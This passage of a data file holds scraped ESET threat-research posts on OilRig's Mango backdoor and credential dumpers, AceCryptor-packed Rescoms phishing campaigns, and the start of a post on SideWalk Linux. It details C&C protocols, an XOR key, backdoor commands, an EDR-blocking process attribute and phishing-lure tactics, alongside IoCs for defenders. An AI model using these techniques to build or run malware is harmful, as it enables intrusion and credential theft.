to Mango.\nIt has a similar workflow to Solar and overlapping capabilities, but there are nevertheless several notable changes: - Use of TLS for C&C communications. -\nUse of native APIs, rather than .NET APIs, to execute files and shell commands. -\nAlthough not actively used, detection evasion code was introduced. -\nSupport for automated exfiltration (Venus in Solar) has been removed; instead, Mango supports an additional backdoor command for exfiltrating selected files. -\nSupport for log mode has been removed, and symbol names have been obfuscated.\nContrary to Solar’s astronomy-themed naming scheme, Mango obfuscates its symbol names, as can be seen in Figure 7.\nBesides the symbol name obfuscation, Mango also uses the string stacking method (as shown in Figure 8) to obfuscate strings, which complicates the use of simple detection methods.\nSimilar to Solar, the Mango backdoor starts by creating an in-memory task, scheduled to run indefinitely every 32 seconds.\nThis task communicates with the C&C server and executes backdoor commands, similar to Solar’s Earth task.\nWhile Solar also creates Venus, a task for automated exfiltration, this functionality has been replaced in Mango by a new backdoor command.\nIn the main task, Mango first generates a victim identifier, To request a backdoor command, Mango then sends the string d@ The request body is constructed as follows: - The data to be transmitted is XOR encrypted using the encryption key Q&4g, then base64 encoded. -\nA pseudorandom string of 3–14 characters is generated from this alphabet (as it appears in the code): i8p3aEeKQbN4klFMHmcC2dU9f6gORGIhDBLS0jP5Tn7o1AVJ. -\nThe encrypted data is inserted in a pseudorandom position within the generated string, enclosed between [@ and @] delimiters.\nTo communicate with its C&C server, Mango uses the TLS (Transport Layer Security) protocol, which is used to provide an additional layer of encryption.\nSimilarly, the backdoor command received from the C&C server is XOR encrypted, base64 encoded, and then enclosed between [@ and @] within the HTTP response body.\nThe command itself is either NCNT (in which case no action is taken), or a string of several parameters delimited by @, as detailed in Table 1, which lists Mango’s backdoor commands.\nNote that Table 1.\nList of Mango’s backdoor commands | Arg1 | Arg2 | Arg3 | Action taken | Return value | | | 1 or empty string | +sp | N/A | Executes the specified file/shell command (with the optional arguments), using the native CreateProcess API imported via DllImport.\nIf the arguments contain [s], it is replaced by C:\\Windows\\System32\\. | Command output.\n| | | +nu | N/A | Returns the malware version string and C&C URL.\n| 1.0.0|http://www.darush.co[.]il/ads.asp | || | +fl | N/A | Enumerates the content of the specified directory (or current working directory).\n| Directory of For each subdirectory: For each file: | || | +dn | N/A | Uploads the file content to the C&C server via a new HTTP POST request formatted: u@ | One of: · file[ · file not found! ·\nfile path empty!\n| || | 2 | Base64-encoded data | Filename | Dumps the specified data into a file in the working directory.\n| file downloaded to path[ | Each backdoor command is handled in a new thread, and their return values are then base64 encoded and combined with other metadata.\nFinally, that string is sent to the C&C server using the same protocol and encryption method as described above.\nUnused detection evasion technique Interestingly, we found an unused detection evasion technique within Mango.\nThe function responsible for executing files and commands downloaded from the C&C server takes an optional second parameter – a process ID.\nIf set, Mango then uses the UpdateProcThreadAttribute API to set the PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY (0x20007) attribute for the specified process to value: PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x100000000000), as shown in Figure 9.\nThis technique’s goal is to block endpoint security solutions from loading their user-mode code hooks via a DLL in this process.\nWhile the parameter was not used in the sample we analyzed, it could be activated in future versions.\nVersion 1.1.1 Unrelated to the Juicy Mix campaign, in July 2023 we found a new version of the Mango backdoor (SHA-1: C9D18D01E1EC96BE952A9D7BD78F6BBB4DD2AA2A), uploaded to VirusTotal by several users under the name Menorah.exe.\nThe internal version in this sample was changed from 1.0.0 to 1.1.1, but the only notable change is the use of a different C&C server, http://tecforsc-001-site1.gtempurl[.]com/ads.asp.\nAlong with this version, we also discovered a Microsoft Word document (SHA-1: 3D71D782B95F13EE69E96BCF73EE279A00EAE5DB) with a malicious macro that drops the backdoor.\nFigure 10 shows the fake warning message, enticing the user to enable macros for the document, and the decoy content that is displayed afterwards, while the malicious code is running in the background.\nFigure 10.\nMicrosoft Word document with a malicious macro that drops Mango v1.1.1 Post-compromise tools In this section, we review a selection of post-compromise tools used in OilRig’s Outer Space and Juicy Mix campaigns, aimed at downloading and executing additional payloads, and stealing data from the compromised systems.\nSampleCheck5000 (SC5k) downloader SampleCheck5000 (or SC5k) is a downloader used to download and execute additional OilRig tools, notable for using the Microsoft Office Exchange Web Services API for C&C communication: the attackers create draft messages in this email account and hide the backdoor commands in there.\nSubsequently, the downloader logs into the same account, and parses the drafts to retrieve commands and payloads to execute.\nSC5k uses predefined values – Microsoft Exchange URL, email address, and password – to log into the remote Exchange server, but it also supports the option to override these values using a configuration file in the current working directory named setting.key.\nWe chose the name SampleCheck5000 based on one of the email addresses that the tool used in the Outer Space campaign.\nOnce SC5k logs into the remote Exchange server, it retrieves all the emails in the Drafts directory, sorts them by most recent, keeping only the drafts that have attachments.\nIt then iterates over every draft message with an attachment, looking for JSON attachments that contain \"data\" in the body.\nIt extracts the value from the key data in the JSON file, base64 decodes and decrypts the value, and calls cmd.exe to execute the resulting command line string.\nSC5k then saves the output of the cmd.exe execution to a local variable.\nAs the next step in the loop, the downloader reports the results to the OilRig operators by creating a new email message on the Exchange server and saving it as a draft (not sending), as shown in Figure 11.\nA similar technique is used to exfiltrate files from a local staging folder.\nAs the last step in the loop, SC5k also logs the command output in an encrypted and compressed format on disk.\nBrowser-data dumpers It is characteristic of OilRig operators to use browser-data dumpers in their post-compromise activities.\nWe discovered two new browser-data stealers among the post-compromise tools deployed in the Juicy Mix campaign alongside the Mango backdoor.\nThey dump the stolen browser data in the %TEMP% directory into files named Cupdate and Eupdate (hence our names for them: CDumper and EDumper).\nBoth tools are C#/.NET browser-data stealers, collecting cookies, browsing history, and credentials from the Chrome (CDumper) and Edge (EDumper) browsers.\nWe focus our analysis on CDumper, since both stealers are practically identical, save for some constants.\nWhen executed, CDumper creates a list of users with Google Chrome installed.\nOn execution, the stealer connects to the Chrome SQLite Cookies, History and Login Data databases under %APPDATA%\\Local\\Google\\Chrome\\User Data, and collects browser data including visited URLs and saved logins, using SQL queries.\nThe cookie values are then decrypted, and all collected information is added to a log file named C:\\Users\\ (see Figure 12), HistoryGrab, and PasswordGrab.\nNote that there is no exfiltration mechanism implemented in CDumper, but Mango can exfiltrate selected files via a backdoor command.\nIn both Outer Space and the earlier Out to Sea campaign, OilRig used a C/C++ Chrome data dumper called MKG.\nLike CDumper and EDumper, MKG was also able to steal usernames and passwords, browsing history, and cookies from the browser.\nThis Chrome data dumper is typically deployed in the following file locations (with the first location being the most common): - %USERS%\\public\\programs\\vmwaredir\\ \\mkc.exe - %USERS%\\Public\\M64.exe Windows Credential Manager stealer Besides browser-data dumping tools, OilRig also used a Windows Credential Manager stealer in the Juicy Mix campaign.\nThis tool steals credentials from Windows Credential Manager, and similar to CDumper and EDumper, stores them in the %TEMP% directory – this time into a file named IUpdate (hence the name IDumper).\nUnlike CDumper and EDumper, IDumper is implemented as a PowerShell script.\nAs with the browser dumper tools, it is not uncommon for OilRig to collect credentials from the Windows Credential Manager.\nPreviously, OilRig’s operators were observed using VALUEVAULT, a publicly available, Go-compiled credential-theft tool (see the 2019 HardPass campaign and a 2020 campaign), for the same purpose.\nConclusion OilRig continues to innovate and create new implants with backdoor-like capabilities while finding new ways to execute commands on remote systems.\nThe group improved upon its C#/.NET Solar backdoor from the Outer Space campaign to create a new backdoor named Mango for the Juicy Mix campaign.\nThe group deploys a set of custom post-compromise tools that are used to collect credentials, cookies, and browsing history from major browsers and from the Windows Credential Manager.\nDespite these innovations, OilRig also continues to rely on established ways to obtain user data.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs Files | SHA-1 | Filename | ESET detection name | Description | | 3D71D782B95F13EE69E96BCF73EE279A00EAE5DB | MyCV.doc | VBA/OilRig.\nC | Document with malicious macro dropping Mango.\n| | 3699B67BF4E381847BF98528F8CE2B966231F01A | chrome_log.vbs | VBS/TrojanDropper.\nAgent.\nPCC | VBS dropper.\n| | 1DE4810A10FA2D73CC589CA403A4390B02C6DA5E | Solar.exe | MSIL/OilRig.\nE | Solar backdoor.\n| | CB26EBDE498ECD2D7CBF1BC498E1BCBB2619A96C | Mango.exe | MSIL/OilRig.\nE | Mango backdoor (v1.0.0).\n| | C9D18D01E1EC96BE952A9D7BD78F6BBB4DD2AA2A | Menorah.exe | MSIL/OilRig.\nE | Mango backdoor (v1.1.1).\n| | 83419CBA55C898FDBE19DFAFB5B1B207CC443190 | EdgeUpdater.exe | MSIL/PSW.Agent.\nSXJ | Edge data dumper.\n| | DB01095AFEF88138C9ED3847B5D8AF954ED7BBBC | Gr.exe | MSIL/PSW.Agent.\nSXJ | Chrome data dumper.\n| | BE01C95C2B5717F39B550EA20F280D69C0C05894 | ieupdater.exe | PowerShell/PSW.Agent.\nAH | Windows Credential Manager dumper.\n| | 6A1BA65C9FD8CC9DCB0657977DB2B03DACDD8A2A | mkc.exe | Win64/PSW.Agent.\nAW | MKG - Chrome data dumper.\n| | 94C08A619AF2B08FEF08B131A7A59D115C8C2F7B | mkkc.exe | Win64/PSW.Agent.\nAW | MKG - Chrome data dumper.\n| | CA53B8EB76811C1940D814AAA8FE875003805F51 | cmk.exe | Win64/PSW.Agent.\nAW | MKG - Chrome data dumper.\n| | BE9B6ACA8A175DF61F2C75932E029F19789FD7E3 | CCXProcess.exe | MSIL/OilRig.\nA | SC5k downloader (32-bit version).\n| | 2236D4DCF68C65A822FF0A2AD48D4DF99761AD07 | acrotray.exe | MSIL/OilRig.\nD | SC5k downloader (64-bit version).\n| | EA8C3E9F418DCF92412EB01FCDCDC81FDD591BF1 | node.exe | MSIL/OilRig.\nD | SC5k downloader (64-bit version).\n| Network | IP | Domain | Hosting provider | First seen | Details | | 199.102.48[.]42 | tecforsc-001-site1.gtempurl[.]com | MarquisNet | 2022-07-29 | N/A | MITRE ATT&CK techniques This table was built using version 13 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Resource Development | Compromise Infrastructure: Server | In both Outer Space and Juicy Mix campaigns, OilRig has compromised legitimate websites to stage malicious tools and for C&C communications.\n| | | Develop Capabilities: Malware | OilRig has developed custom backdoors (Solar and Mango), a downloader (SC5k), and a set of credential-theft tools for use in its operations.\n| || | Stage Capabilities: Upload Malware | OilRig has uploaded malicious components to its C&C servers, and stored prestaged files and commands in the Drafts email directory of an Office 365 account for SC5k to download and execute.\n| || | Stage Capabilities: Upload Tool | OilRig has uploaded malicious tools to its C&C servers, and stored prestaged files in the Drafts email directory of an Office 365 account for SC5k to download and execute.\n| || | Initial Access | Phishing: Spearphishing Attachment | OilRig probably distributed its Outer Space and Juicy Mix campaigns via phishing emails with their VBS droppers attached.\n| | | Execution | Scheduled Task/Job: Scheduled Task | OilRig’s IDumper, EDumper, and CDumper tools use scheduled tasks named ie Solar and Mango use a C#/.NET task on a timer to iteratively execute their main functions.\n| | | Command and Scripting Interpreter: PowerShell | OilRig’s IDumper tool uses PowerShell for execution.\n| || | Command and Scripting Interpreter: Windows Command Shell | OilRig’s Solar, SC5k, IDumper, EDumper, and CDumper use cmd.exe to execute tasks on the system.\n| || | Command and Scripting Interpreter: Visual Basic | OilRig uses a malicious VBScript to deliver and persist its Solar and Mango backdoors.\n| || | Native API | OilRig’s Mango backdoor uses the CreateProcess Windows API for execution.\n| || | Persistence | Scheduled Task/Job: Scheduled Task | OilRig’s VBS dropper schedules a task named ReminderTask to establish persistence for the Mango backdoor.\n| | | Defense Evasion | Masquerading: Match Legitimate Name or Location | OilRig uses legitimate or innocuous filenames for its malware to disguise itself from defenders and security software.\n| | | Obfuscated Files or Information: Software Packing | OilRig has used SAPIEN Script Packager and SmartAssembly obfuscator to obfuscate its IDumper tool.\n| || | Obfuscated Files or Information: Embedded Payloads | OilRig’s VBS droppers have malicious payloads embedded within them as a series of base64 substrings.\n| || | Masquerading: Masquerade Task or Service | In order to appear legitimate, Mango’s VBS dropper schedules a task with the description Start notepad at a certain time.\n| || | Indicator Removal: Clear Persistence | OilRig’s post-compromise tools delete their scheduled tasks after a certain time period.\n| || | Deobfuscate/Decode Files or Information | OilRig uses several obfuscation methods to protect its strings and embedded payloads.\n| || | Subvert Trust Controls | SC5k uses Office 365, generally a trusted third party and often overlooked by defenders, as a download site.\n| || | Impair Defenses | OilRig’s Mango backdoor has an (as yet) unused capability to block endpoint security solutions from loading their user-mode code in specific processes.\n| || | Credential Access | Credentials from Password Stores: Credentials from Web Browsers | OilRig’s custom tools MKG, CDumper, and EDumper can obtain credentials, cookies, and browsing history from Chrome and Edge browsers.\n| | | Credentials from Password Stores: Windows Credential Manager | OilRig’s custom credential dumping tool IDumper can steal credentials from the Windows Credential Manager.\n| || | Discovery | System Information Discovery | Mango obtains the compromised computer name.\n| | | File and Directory Discovery | Mango has a command to enumerate the content of a specified directory.\n| || | System Owner/User Discovery | Mango obtains the victim’s username.\n| || | Account Discovery: Local Account | OilRig’s EDumper, CDumper, and IDumper tools can enumerate all user accounts on the compromised host.\n| || | Browser Information Discovery | MKG dumps Chrome history and bookmarks.\n| || | Command and Control | Application Layer Protocol: Web Protocols | Mango uses HTTP in C&C communications.\n| | | Ingress Tool Transfer | Mango has the capability to download additional files from the C&C server for subsequent execution.\n| || | Data Obfuscation | Solar and SC5k use a simple XOR-encryption method along with gzip compression to obfuscate data at rest and in transit.\n| || | Web Service: Bidirectional Communication | SC5k uses Office 365 for downloading files from and uploading files to the Drafts directory in a legitimate email account.\n| || | Data Encoding: Standard Encoding | Solar, Mango, and MKG base64 decodes data before sending it to the C&C server.\n| || | Encrypted Channel: Symmetric Cryptography | Mango uses an XOR cipher with the key Q&4g to encrypt data in C&C communication.\n| || | Encrypted Channel: Asymmetric Cryptography | Mango uses TLS for C&C communication.\n| || | Exfiltration | Exfiltration Over C2 Channel | Mango, Solar, and SC5k use their C&C channels for exfiltration.\n|","num_sentences":217,"metadata":{"source":"blog","platform":"welivesecurity","filename":"oilrigs"}}
{"id":213,"title":"Rescoms rides waves of AceCryptor spam","publish_date":"2024-03-20","link":"https://www.welivesecurity.com/en/eset-research/rescoms-rides-waves-acecryptor-spam/","clean_text":"Last year ESET published a blogpost about AceCryptor – one of the most popular and prevalent cryptors-as-a-service (CaaS) operating since 2016.\nFor H1 2023 we published statistics from our telemetry, according to which trends from previous periods continued without drastic changes.\nHowever, in H2 2023 we registered a significant change in how AceCryptor is used.\nNot only we have seen and blocked over double the attacks in H2 2023 in comparison with H1 2023, but we also noticed that Rescoms (also known as Remcos) started using AceCryptor, which was not the case beforehand.\nThe vast majority of AceCryptor-packed Rescoms RAT samples were used as an initial compromise vector in multiple spam campaigns targeting European countries including Poland, Slovakia, Bulgaria, and Serbia.\nKey points of this blogpost: - AceCryptor continued to provide packing services to tens of very well-known malware families in H2 2023. -\nEven though well known by security products, AceCryptor’s prevalence is not showing indications of decline: on the contrary, the number of attacks significantly increased due to the Rescoms campaigns. -\nAceCryptor is a cryptor of choice of threat actors targeting specific countries and targets (e.g., companies in a particular country). -\nIn H2 2023, ESET detected multiple AceCryptor+Rescoms campaigns in European countries, mainly Poland, Bulgaria, Spain, and Serbia. -\nThe threat actor behind those campaigns in some cases abused compromised accounts to send spam emails in order to make them look as credible as possible. -\nThe goal of the spam campaigns was to obtain credentials stored in browsers or email clients, which in case of a successful compromise would open possibilities for further attacks.\nAceCryptor in H2 2023 In the first half of 2023 ESET protected around 13,000 users from AceCryptor-packed malware.\nIn the second half of the year, there was a massive increase of AceCryptor-packed malware spreading in the wild, with our detections tripling, resulting in over 42,000 protected ESET users worldwide.\nAs can be observed in Figure 1, we detected multiple sudden waves of malware spreading.\nThese spikes show multiple spam campaigns targeted at European countries where AceCryptor packed a Rescoms RAT (discussed more in the Rescoms campaigns section).\nFurthermore, when we compare the raw number of samples: in the first half of 2023, ESET detected over 23,000 unique malicious samples of AceCryptor; in the second half of 2023, we saw and detected “only” over 17,000 unique samples.\nEven though this might be unexpected, after a closer look at the data there is a reasonable explanation.\nThe Rescoms spam campaigns used the same malicious file(s) in email campaigns sent to a greater number of users, thus increasing the number of people who encountered the malware, but still keeping the number of different files low.\nThis did not happen in previous periods as Rescoms was almost never used in combination with AceCryptor.\nAnother reason for the decrement in the number of unique samples is because some popular families apparently stopped (or almost stopped) using AceCryptor as their go-to CaaS. An example is Danabot malware which stopped using AceCryptor; also, the prominent RedLine Stealer whose users stopped using AceCryptor as much, based on a greater than 60% decrease in AceCryptor samples containing that malware.\nAs seen in Figure 2, AceCryptor still distributes, apart from Rescoms, samples from many different malware families, such as SmokeLoader, STOP ransomware, and Vidar stealer.\nIn the first half of 2023, the countries most affected by malware packed by AceCryptor were Peru, Mexico, Egypt, and Türkiye, where Peru, at 4,700, had the greatest number of attacks.\nRescoms spam campaigns changed these statistics dramatically in the second half of the year.\nAs can be seen in Figure 3, AceCryptor-packed malware affected mostly European countries.\nBy far the most affected country is Poland, where ESET prevented over 26,000 attacks; this is followed by Ukraine, Spain, and Serbia.\nAnd, it’s worth mentioning that in each of those countries ESET products prevented more attacks than in the most affected country in H1 2023, Peru.\nAceCryptor samples that we’ve observed in H2 often contained two malware families as their payload: Rescoms and SmokeLoader.\nA spike in Ukraine was caused by SmokeLoader.\nThis fact was already mentioned by Ukraine’s NSDC.\nOn the other hand, in Poland, Slovakia, Bulgaria, and Serbia the increased activity was caused by AceCryptor containing Rescoms as a final payload.\nRescoms campaigns In the first half of 2023, we saw in our telemetry fewer than a hundred incidents of AceCryptor samples with Rescoms inside.\nDuring the second half of the year, Rescoms became the most prevalent malware family packed by AceCryptor, with over 32,000 hits.\nOver half of these attempts happened in Poland, followed by Serbia, Spain, Bulgaria, and Slovakia (Figure 4).\nCampaigns in Poland Thanks to ESET telemetry we’ve been able to observe eight significant spam campaigns targeting Poland in H2 2023.\nAs can be seen in Figure 5, the majority of them happened in September, but there were also campaigns in August and December.\nIn total, ESET registered over 26,000 of these attacks in Poland for this period.\nAll spam campaigns targeted businesses in Poland and all emails had very similar subject lines about B2B offers for the victim companies.\nTo look as believable as possible, the attackers incorporated the following tricks into the spam emails: - Email addresses they were sending spam emails from imitated domains of other companies.\nAttackers used a different TLD, changed a letter in a company name or the word order in the case of a multi-word company name (this technique is known as typosquatting). -\nThe most noteworthy is that multiple campaigns involved business email compromise – attackers abused previously compromised email accounts of other company employees to send spam emails.\nIn this way even if the potential victim looked for the usual red flags, they were just not there, and the email looked as legitimate as it could have.\nAttackers did their research and used existing Polish company names and even existing employee/owner names and contact information when signing those emails.\nThis was done so that in the case where a victim tries to Google the sender’s name, the search would be successful, which might lead them to open the malicious attachment. -\nThe content of spam emails was in some cases simpler but in many cases (like the example in Figure 6) quite elaborate.\nEspecially these more elaborate versions should be considered dangerous as they deviate from the standard pattern of generic text, which is often riddled with grammatical mistakes.\nThe email shown in Figure 6 contains a message followed by information about the processing of personal information done by the alleged sender and the possibility to “access the content of your data and the right to rectify, delete, limit processing restrictions, right to data transfer, right to raise an objection, and the right to lodge a complaint with the supervisory authority”.\nThe message itself can be translated thus: Dear Sir, I am Sylwester [redacted] from [redacted].\nYour company was recommended to us by a business partner.\nPlease quote the attached order list.\nPlease also inform us about the payment terms.\nWe look forward to your response and further discussion. --\nBest Regards, Attachments in all campaigns looked quite similar (Figure 7).\nEmails contained an attached archive or ISO file named offer/inquiry (of course in Polish), in some cases also accompanied with an order number.\nThat file contained an AceCryptor executable that unpacked and launched Rescoms.\nBased on the behavior of the malware, we assume that the goal of these campaigns was to obtain email and browser credentials, and thus gain initial access to the targeted companies.\nWhile it is unknown whether the credentials were gathered for the group that carried out these attacks or if those stolen credentials would be later sold to other threat actors, it is certain that successful compromise opens the possibility for further attacks, especially from, currently popular, ransomware attacks.\nIt is important to state that Rescoms RAT can be bought; thus many threat actors use it in their operations.\nThese campaigns are not only connected by target similarity, attachment structure, email text, or tricks and techniques used to deceive potential victims, but also by some less obvious properties.\nIn the malware itself, we were able to find artifacts (e.g., the license ID for Rescoms) that tie those campaigns together, revealing that many of these attacks were carried out by one threat actor.\nCampaigns in Slovakia, Bulgaria, and Serbia During the same time periods as the campaigns in Poland, ESET telemetry also registered ongoing campaigns in Slovakia, Bulgaria, and Serbia.\nThese campaigns also mainly targeted local companies and we can even find artifacts in the malware itself tying these campaigns to the same threat actor that carried out the campaigns in Poland.\nThe only significant thing that changed was, of course, the language used in the spam emails to be suitable for those specific countries.\nCampaigns in Spain Apart from previously mentioned campaigns, Spain also experienced a surge of spam emails with Rescoms as the final payload.\nEven though we can confirm that at least one of the campaigns was carried out by the same threat actor as in these previous cases, other campaigns followed a somewhat different pattern.\nFurthermore, even artifacts that were the same in previous cases differed in these and, because of that, we cannot conclude that the campaigns in Spain originated from the same place.\nConclusion During the second half of 2023 we detected a shift in the usage of AceCryptor – a popular cryptor used by multiple threat actors to pack many malware families.\nEven though the prevalence of some malware families like RedLine Stealer dropped, other threat actors started using it or used it even more for their activities and AceCryptor is still going strong.\nIn these campaigns AceCryptor was used to target multiple European countries, and to extract information or gain initial access to multiple companies.\nMalware in these attacks was distributed in spam emails, which were in some cases quite convincing; sometimes the spam was even sent from legitimate, but abused email accounts.\nBecause opening attachments from such emails can have severe consequences for you or your company, we advise that you be aware about what you are opening and use reliable endpoint security software able to detect the malware.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs A comprehensive list of Indicators of Compromise (IoCs) can be found in our GitHub repository.\nFiles | SHA-1 | Filename | Detection | Description | | 7D99E7AD21B54F07E857 | PR18213.iso | Win32/Kryptik.\nHVOB | Malicious attachment from spam campaign carried out in Serbia during December 2023.\n| | 7DB6780A1E09AEC6146E | zapytanie.7z | Win32/Kryptik.\nHUNX | Malicious attachment from spam campaign carried out in Poland during September 2023.\n| | 7ED3EFDA8FC446182792 | 20230904104100858.7z | Win32/Kryptik.\nHUMX | Malicious attachment from spam campaign carried out in Poland and Bulgaria during September 2023.\n| | 9A6C731E96572399B236 | 20230904114635180.iso | Win32/Kryptik.\nHUMX | Malicious attachment from spam campaign carried out in Serbia during September 2023.\n| | 57E4EB244F3450854E5B | SA092300102.iso | Win32/Kryptik.\nHUPK | Malicious attachment from spam campaign carried out in Bulgaria during September 2023.\n| | 178C054C5370E0DC9DF8 | zamowienie_135200.7z | Win32/Kryptik.\nHUMI | Malicious attachment from spam campaign carried out in Poland during August 2023.\n| | 394CFA4150E7D47BBDA1 | PRV23_8401.iso | Win32/Kryptik.\nHUMF | Malicious attachment from spam campaign carried out in Serbia during August 2023.\n| | 3734BC2D9C321604FEA1 | BP_50C55_20230 | Win32/Kryptik.\nHUMF | Malicious attachment from spam campaign carried out in Bulgaria during August 2023.\n| | 71076BD712C2E3BC8CA5 | 20_J402_MRO_EMS | Win32/Rescoms.\nB | Malicious attachment from spam campaign carried out in Slovakia during August 2023.\n| | 667133FEBA54801B0881 | 7360_37763.iso | Win32/Rescoms.\nB | Malicious attachment from spam campaign carried out in Bulgaria during December 2023.\n| | AF021E767E68F6CE1D20 | zapytanie ofertowe.7z | Win32/Kryptik.\nHUQF | Malicious attachment from spam campaign carried out in Poland during September 2023.\n| | BB6A9FB0C5DA4972EFAB | 129550.7z | Win32/Kryptik.\nHUNC | Malicious attachment from spam campaign carried out in Poland during September 2023.\n| | D2FF84892F3A4E4436BE | Zamowienie_ andre.7z | Win32/Kryptik.\nHUOZ | Malicious attachment from spam campaign carried out in Poland during September 2023.\n| | DB87AA88F358D9517EEB | 20030703_S1002.iso | Win32/Kryptik.\nHUNI | Malicious attachment from spam campaign carried out in Serbia during September 2023.\n| | EF2106A0A40BB5C1A74A | Zamowienie_830.iso | Win32/Kryptik.\nHVOB | Malicious attachment from spam campaign carried out in Poland during December 2023.\n| | FAD97EC6447A699179B0 | lista zamówień i szczegółowe zdjęcia.arj | Win32/Kryptik.\nHUPK | Malicious attachment from spam campaign carried out in Poland during September 2023.\n| | FB8F64D2FEC152D2D135 | Pedido.iso | Win32/Kryptik.\nHUMF | Malicious attachment from spam campaign carried out in Spain during August 2023.\n| MITRE ATT&CK techniques This table was built using version 14 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Reconnaissance | Gather Victim Identity Information: Email Addresses | Email addresses and contact information (either bought or gathered from publicly available sources) were used in phishing campaigns to target companies across multiple countries.\n| | | Resource Development | Compromise Accounts: Email Accounts | Attackers used compromised email accounts to send phishing emails in spam campaigns to increase spam email’s credibility.\n| | | Obtain Capabilities: Malware | Attackers bought and used AceCryptor and Rescoms for phishing campaigns.\n| || | Initial Access | Phishing | Attackers used phishing messages with malicious attachments to compromise computers and steal information from companies in multiple European countries.\n| | | Phishing: Spearphishing Attachment | Attackers used spearphishing messages to compromise computers and steal information from companies in multiple European countries.\n| || | Execution | User Execution: Malicious File | Attackers relied on users opening and launching malicious files with malware packed by AceCryptor.\n| | | Credential Access | Credentials from Password Stores: Credentials from Web Browsers | Attackers tried to steal credential information from browsers and email clients.\n|","num_sentences":117,"metadata":{"source":"blog","platform":"welivesecurity","filename":"rescoms"}}
{"id":214,"title":"You never walk alone: The SideWalk backdoor gets a Linux variant","publish_date":"2022-09-14","link":"https://www.welivesecurity.com/2022/09/14/you-never-walk-alone-sidewalk-backdoor-linux-variant/","clean_text":"ESET researchers have discovered a Linux variant of the SideWalk backdoor, one of the multiple custom implants used by the SparklingGoblin APT group.\nThis variant was deployed against a Hong Kong university in February 2021, the same university that had already been targeted by SparklingGoblin during the student protests in May 2020.\nWe originally named this backdoor StageClient, but now refer to it simply as SideWalk Linux.\nWe also discovered that a previously known Linux backdoor – the Specter RAT, first documented by 360 Netlab – is also actually a SideWalk Linux variant, having multiple commonalities with the samples we identified.\nSparklingGoblin is an APT group whose tactics, techniques, and procedures (TTPs) partially overlap with APT41 and BARIUM.\nIt makes use of Motnug and ChaCha20-based loaders, the CROSSWALK and SideWalk backdoors, along with Korplug (aka PlugX) and Cobalt Strike.\nWhile the group targets mostly East and Southeast Asia, we have also seen SparklingGoblin targeting a broad range of organizations and verticals around the world, with a particular focus on the academic sector.\nSparklingGoblin is one of the groups with access to the ShadowPad backdoor.\nThis blogpost documents SideWalk Linux, its victimology, and its numerous similarities with the originally discovered SideWalk backdoor.\nAttribution The SideWalk backdoor is exclusive to SparklingGoblin.\nIn addition to the multiple code similarities between the Linux variants of SideWalk and various SparklingGoblin tools, one of the SideWalk Linux samples uses a C&C address (66.42.103[.]222) that was previously used by SparklingGoblin.\nConsidering all of these factors, we attribute with high confidence SideWalk Linux to the SparklingGoblin APT group.\nVictimology Even though there are various SideWalk Linux samples, as we now know them, on VirusTotal, in our telemetry we have found only one victim compromised with this SideWalk variant: a Hong Kong university that, amidst student protests, had previously been targeted by both SparklingGoblin (using the Motnug loader and the CROSSWALK backdoor) and Fishmonger (using the ShadowPad and Spyder backdoors).\nNote that at that time we put those two different clusters of activity under the broader Winnti Group denomination.\nSparklingGoblin first compromised this particular university in May 2020, and we first detected the Linux variant of SideWalk in that university’s network in February 2021.\nThe group continuously targeted this organization over a long period of time, successfully compromising multiple key servers, including a print server, an email server, and a server used to manage student schedules and course registrations.\nThe road to Sidewalk Linux SideWalk, which we first described in its Windows form in our blogpost on August 24th, 2021, is a multipurpose backdoor that can load additional modules sent from the C&C server.\nIt makes use of Google Docs as a dead-drop resolver, and Cloudflare workers as its C&C server.\nIt can properly handle communication behind a proxy.\nThe compromise chain is currently unknown, but we think that the initial attack vector could have been exploitation.\nThis hypothesis is based on the 360 Netlab article describing the Specter botnet targeting IP cameras, and NVR and DVR devices, and the fact that the Hong Kong victim used a vulnerable WordPress server, since there were many attempts to install various webshells.\nWe first documented the Linux variant of SideWalk as StageClient on July 2nd, 2021, without making the connection at that time to SparklingGoblin and its custom SideWalk backdoor.\nThe original name was used because of the repeated appearances of the string StageClient in the code.\nWhile researching StageClient further, we found a blogpost about the Specter botnet described by 360 Netlab.\nThat blogpost describes a modular Linux backdoor with flexible configuration that uses a ChaCha20 encryption variant – basically a subset of StageClient’s functionality.\nFurther inspection confirmed this hypothesis; we additionally found a huge overlap in functionality, infrastructure, and symbols present in all the binaries.\nWe compared the StageClient sample E5E6E100876E652189E7D25FFCF06DE959093433 with Specter samples 7DF0BE2774B17F672B96860D013A933E97862E6C and found numerous similarities, some of which we list below.\nFirst, there is an overlap in C&C commands.\nNext, the samples have the same structure of configuration and encryption method (see Figure 1 and Figure 2).\nAdditionally, the samples’ modules are managed in almost the same way, and the majority of the interfaces are identical; modules of StageClient only need to implement one additional handler, which is for closing the module.\nThree out of the five known modules are almost identical.\nLastly, we could see striking overlaps in the network protocols of the compared samples.\nA variant of ChaCha20 is used twice for encryption with LZ4 compression in the very same way.\nBoth StageClient and Specter create a number of threads (see Figure 3 and Figure 4) to manage sending and receiving asynchronous messages along with heartbeats.\nDespite all these striking similarities, there are several changes.\nThe most notable ones are the following: - The authors switched from the C language to C++.\nThe reason is unknown, but it should be easier to implement such modular architecture in C++ due to its polymorphism support. -\nAn option to exchange messages over HTTP was added (see Figure 5 and Figure 6). -\nDownloadable plugins were replaced with precompiled modules that fulfill the same purpose; a number of new commands and two new modules were added. -\nAdded the module TaskSchedulerMod, which operates as a built-in cron utility.\nIts cron table is stored in memory; the jobs are received over the network and executed as shell commands. -\nAdded the module SysInfoMgr, which provides information about the underlying system such as the list of installed packages and hardware details.\nThese similarities convince us that Specter and StageClient are from the same malware family.\nHowever, considering the numerous code overlaps between the StageClient variant used against the Hong Kong university in February 2021 and SideWalk for Windows, as described in the next section, we now believe that Specter and StageClient are both Linux variants of SideWalk, so we have decided to refer to them as SideWalk Linux.\nSimilarities with the Windows variant SideWalk Windows and SideWalk Linux share too many similarities to describe within the confines of this blogpost, so here we only cover the most striking ones.\nChaCha20 